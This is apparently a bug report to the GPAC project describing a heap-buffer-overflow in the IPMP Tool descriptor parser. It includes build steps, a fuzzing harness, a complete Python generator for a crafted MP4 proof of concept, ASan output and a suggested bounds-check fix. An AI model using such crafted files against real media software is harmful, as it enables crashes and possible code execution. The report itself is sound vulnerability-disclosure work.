# Heap-buffer-overflow in `gf_odf_read_ipmp_tool` when parsing crafted MP4 with IPMP Tool descriptor

- [x] I looked for a similar issue and couldn't find any clearly matching public GPAC issue for this exact function / path.
- [x] I tried with the latest version of GPAC.
- [x] I gave enough information for contributors to reproduce the issue (meaningful title, platform and compiler, command line, input file, etc.).

## Summary

A heap-buffer-overflow (write) exists in `gf_odf_read_ipmp_tool()` in `src/odf/odf_code.c`. The IPMP Tool descriptor parser reads a `num_alternate` count from the bitstream and writes that many 16-byte entries into the fixed-size array `specificToolID[MAX_IPMP_ALT_TOOLS]` (where `MAX_IPMP_ALT_TOOLS = 20`) without bounds-checking against the array limit.

A crafted MP4 file with `num_alternate = 30` writes 10 extra entries (160 bytes) past the heap-allocated buffer, resulting in a heap-buffer-overflow detected by AddressSanitizer.

Note: This code path is guarded by `#ifndef GPAC_MINIMAL_ODF` and is excluded from the default build and OSS-Fuzz targets.
However, the vulnerable code is present in the source tree and affects any build with full ODF support enabled (i.e., `GPAC_MINIMAL_ODF` undefined).

## Affected code path

- **File:** `src/odf/odf_code.c`
- **Function:** `gf_odf_read_ipmp_tool()` (line ~3340)
- **Header:** `include/gpac/mpeg4_odf.h` (line 385: `#define MAX_IPMP_ALT_TOOLS 20`, line 394: `bin128 specificToolID[MAX_IPMP_ALT_TOOLS]`)

## Root cause

In `gf_odf_read_ipmp_tool()`:

```c
ipmpt->num_alternate = gf_bs_read_int(bs, 8);   // can be 0–255
nbBytes += 1;
for (i=0; i<ipmpt->num_alternate; i++) {
    if (nbBytes + 16 > DescSize) return GF_ODF_INVALID_DESCRIPTOR;
    gf_bs_read_data(bs, (char*)ipmpt->specificToolID[i], 16);  // no check against MAX_IPMP_ALT_TOOLS
    nbBytes += 16;
}
```

The loop guard only checks against `DescSize` (the bitstream descriptor size), **not** against `MAX_IPMP_ALT_TOOLS`.
When `DescSize` is crafted to be large enough, `num_alternate` values > 20 cause out-of-bounds writes into `specificToolID[]`.

## Tested version

- Commit: `a86cd52b6c2a59990cf66631dd33eebe1e87a918` (current `master` HEAD, Apr 7 2026)
- The vulnerable code at `src/odf/odf_code.c:3323–3343` is identical at this commit.

## Environment

- OS: Linux (Debian-based container)
- Compiler: `clang` with AddressSanitizer + libFuzzer
- Build flags: `-O1 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link`
- Requires: `GPAC_MINIMAL_ODF` undefined (see reproduction steps)

## Reproduction

Since the IPMP code path is excluded by default (`GPAC_MINIMAL_ODF` is defined in `include/gpac/setup.h`), reproduction requires disabling it and using a harness that exercises `gf_isom_open_file()`.

### 1. Generate the PoC MP4

```bash
python3 gen_poc.py 30
```

This produces `poc.mp4` with an `iods` box containing an IPMP Tool descriptor where `num_alternate = 30`.

### 2. Build and run inside a GPAC source tree

```bash
cd /path/to/gpac

# Disable GPAC_MINIMAL_ODF to enable IPMP code paths
sed -i 's/^#define GPAC_MINIMAL_ODF$/\/\/#define GPAC_MINIMAL_ODF/' include/gpac/setup.h

# Build static library with ASan
export CC=clang CXX=clang++
CF="-O1 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link"
./configure --static-build --extra-cflags="$CF" --extra-ldflags="$CF"
make -j$(nproc) lib

# Compile excluded ODF modules and add to archive
for src in src/odf/qos.c src/odf/ipmpx_code.c src/odf/oci_codec.c src/odf/ipmpx_dump.c src/odf/ipmpx_parse.c; do
    $CC $CF -I./include -I./ -DGPAC_HAVE_CONFIG_H -c "$src" -o "/tmp/$(basename $src .c).o"
done
ar rcs bin/gcc/libgpac_static.a /tmp/qos.o /tmp/ipmpx_code.o /tmp/oci_codec.o /tmp/ipmpx_dump.o /tmp/ipmpx_parse.o

# Build the harness
$CC $CF -I./include -I./ -DGPAC_HAVE_CONFIG_H -c harness.c -o /tmp/harness.o
$CXX $CF -fsanitize=address,fuzzer -o /tmp/fuzz_ipmp /tmp/harness.o \
    bin/gcc/libgpac_static.a -lm -lz -lpthread -lssl -lcrypto

# Run the PoC
/tmp/fuzz_ipmp poc.mp4
```

### Harness (`harness.c`)

```c
#include <stdio.h>
#include <unistd.h>
#include <gpac/internal/isomedia_dev.h>
#include <gpac/constants.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    char filename[256];
    sprintf(filename, "/tmp/libfuzzer_ipmp.%d", getpid());
    FILE *fp = fopen(filename, "wb");
    if (!fp) return 0;
    fwrite(data, size, 1, fp);
    fclose(fp);
    GF_ISOFile *movie = gf_isom_open_file(filename, GF_ISOM_OPEN_READ_DUMP, NULL);
    if (movie) gf_isom_close(movie);
    unlink(filename);
    return 0;
}
```

### PoC generator (`gen_poc.py`)

```python
#!/usr/bin/env python3
"""Generate a crafted MP4 that triggers heap-buffer-overflow in gf_odf_read_ipmp_tool().

The IPMP Tool descriptor (tag 0x61) has num_alternate=30 but the fixed array
specificToolID[MAX_IPMP_ALT_TOOLS=20] only holds 20 entries, causing a 160-byte
heap overflow when parsing the iods box via gf_isom_open_file().
"""
import struct, sys, os

OUT = os.path.dirname(os.path.abspath(__file__))

def u32(v): return struct.pack(">I", v)
def u16(v): return struct.pack(">H", v)

def box(t, d):
    return u32(8 + len(d)) + t + d

def fullbox(t, ver, flags, d):
    return box(t, u32((ver << 24) | flags) + d)

def odf_desc(tag, d):
    if len(d) < 128:
        return bytes([tag, len(d)]) + d
    s, tmp = [], len(d)
    s.append(tmp & 0x7F); tmp >>= 7
    while tmp: s.append(0x80 | (tmp & 0x7F)); tmp >>= 7
    return bytes([tag]) + bytes(reversed(s)) + d

def build_mp4(num_alt=30):
    tool_data = b'\x00' * 16 + bytes([0x80, num_alt])
    for i in range(num_alt):
        tool_data += bytes([i & 0xFF]) * 16
    tool_list = odf_desc(0x60, odf_desc(0x61, tool_data))
    iod = odf_desc(0x02, u16((1 << 6) | (1 << 4) | 0x0F) + b'\xFF' * 5 + tool_list)
    iods = fullbox(b'iods', 0, 0, iod)
    matrix = b''.join(u32(v) for v in [0x10000, 0, 0, 0, 0x10000, 0, 0, 0, 0x40000000])
    mvhd = fullbox(b'mvhd', 0, 0, u32(0)*2 + u32(90000)*2 + u32(0x10000) + u16(0x100) + b'\x00'*10 + matrix + b'\x00'*24 + u32(2))
    tkhd = fullbox(b'tkhd', 0, 3, u32(0)*2 + u32(1) + u32(0) + u32(90000) + b'\x00'*8 + u16(0)*4 + matrix + u32(320<<16) + u32(240<<16))
    mdhd = fullbox(b'mdhd', 0, 0, u32(0)*2 + u32(90000) + u32(0) + u16(0x55C4) + u16(0))
    hdlr = fullbox(b'hdlr', 0, 0, u32(0) + b'vide' + b'\x00'*12 + b'V\x00')
    stbl = box(b'stbl', fullbox(b'stsd', 0, 0, u32(0)) + fullbox(b'stts', 0, 0, u32(0)) + fullbox(b'stsc', 0, 0, u32(0)) + fullbox(b'stsz', 0, 0, u32(0)+u32(0)) + fullbox(b'stco', 0, 0, u32(0)))
    minf = box(b'minf', fullbox(b'vmhd', 0, 1, b'\x00'*8) + box(b'dinf', fullbox(b'dref', 0, 0, u32(0))) + stbl)
    trak = box(b'trak', tkhd + box(b'mdia', mdhd + hdlr + minf))
    ftyp = box(b'ftyp', b'isom' + u32(0x200) + b'isom')
    moov = box(b'moov', mvhd + iods + trak)
    return ftyp + moov + box(b'mdat', b'\x00'*8)

if __name__ == '__main__':
    num_alt = int(sys.argv[1]) if len(sys.argv) > 1 else 30
    out_path = os.path.join(OUT, "poc.mp4")
    with open(out_path, 'wb') as f:
        f.write(build_mp4(num_alt))
    print(f"Written to {out_path} (num_alternate={num_alt})")
```

## ASan output

```
=================================================================
==4411==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7d02effe01a8 at pc 0x55ea728bc71e bp 0x7fffc22e34c0 sp 0x7fffc22e2c80
WRITE of size 16 at 0x7d02effe01a8 thread T0
    #0 0x55ea728bc71d in __asan_memcpy
    #1 0x55ea72b3e910 in gf_bs_read_data /src/gpac/src/utils/bitstream.c:797:4
    #2 0x55ea72a52640 in gf_odf_read_ipmp_tool /src/gpac/src/odf/odf_code.c:3340:4
    #3 0x55ea72d29e7d in gf_odf_read_descriptor /src/gpac/src/odf/desc_private.c:378:13
    #4 0x55ea72a25873 in gf_odf_parse_descriptor /src/gpac/src/odf/descriptors.c:106:8
    #5 0x55ea72a51f56 in gf_odf_read_ipmp_tool_list /src/gpac/src/odf/odf_code.c:3275:7
    #6 0x55ea72d29dae in gf_odf_read_descriptor /src/gpac/src/odf/desc_private.c:378:13
    #7 0x55ea72a25873 in gf_odf_parse_descriptor /src/gpac/src/odf/descriptors.c:106:8
    #8 0x55ea72a3ea38 in gf_odf_read_iod /src/gpac/src/odf/odf_code.c:501:7
    #9 0x55ea72d29f69 in gf_odf_read_descriptor /src/gpac/src/odf/desc_private.c:280:10
    #10 0x55ea72a25873 in gf_odf_parse_descriptor /src/gpac/src/odf/descriptors.c:106:8
    #11 0x55ea72a541ab in gf_odf_desc_read /src/gpac/src/odf/odf_codec.c:301:6
    #12 0x55ea72c785b2 in iods_box_read /src/gpac/src/isomedia/box_code_base.c:2954:6
    #13 0x55ea72cf27e1 in gf_isom_box_parse_ex /src/gpac/src/isomedia/box_funcs.c:352:14
    #14 0x55ea72cf698d in gf_isom_box_array_read /src/gpac/src/isomedia/box_funcs.c:2060:7
    #15 0x55ea72cf27e1 in gf_isom_box_parse_ex /src/gpac/src/isomedia/box_funcs.c:352:14
    #16 0x55ea72cf1248 in gf_isom_parse_root_box /src/gpac/src/isomedia/box_funcs.c:39:8
    #17 0x55ea729055d4 in gf_isom_parse_movie_boxes /src/gpac/src/isomedia/isom_intern.c:947:6
    #18 0x55ea7290b033 in gf_isom_open_file /src/gpac/src/isomedia/isom_intern.c:1081:19
    #19 0x55ea7290287d in LLVMFuzzerTestOneInput /exploit/harness.c:18:25

0x7d02effe01a8 is located 0 bytes after 360-byte region [0x7d02effe0040,0x7d02effe01a8)
allocated by thread T0 here:
    #0 0x55ea728be9d4 in malloc
    #1 0x55ea72a52392 in gf_odf_new_ipmp_tool /src/gpac/src/odf/odf_code.c:3308:42

SUMMARY: AddressSanitizer: heap-buffer-overflow /src/gpac/src/utils/bitstream.c:797:4 in gf_bs_read_data
```

## Impact

- CWE-122: Heap-based Buffer Overflow (write)
- A crafted MP4 file with an oversized `num_alternate` field in the IPMP Tool descriptor causes a 160-byte out-of-bounds write past the end of a heap-allocated structure.
- This affects any GPAC build with full ODF support enabled (`GPAC_MINIMAL_ODF` undefined). While the default build excludes this code, the vulnerability is latent in the source tree and poses a risk for custom or distribution builds requiring IPMP/ODF support.
- At minimum this is a denial of service (crash); the heap write may also be exploitable for code execution depending on heap layout.

## Suggested fix

Clamp `num_alternate` to `MAX_IPMP_ALT_TOOLS` before the read loop:

```c
ipmpt->num_alternate = gf_bs_read_int(bs, 8);
if (ipmpt->num_alternate > MAX_IPMP_ALT_TOOLS) {
    return GF_ODF_INVALID_DESCRIPTOR;
}
```

## Duplicate check

I did not find a clearly matching public GPAC issue or CVE for this exact function / path.
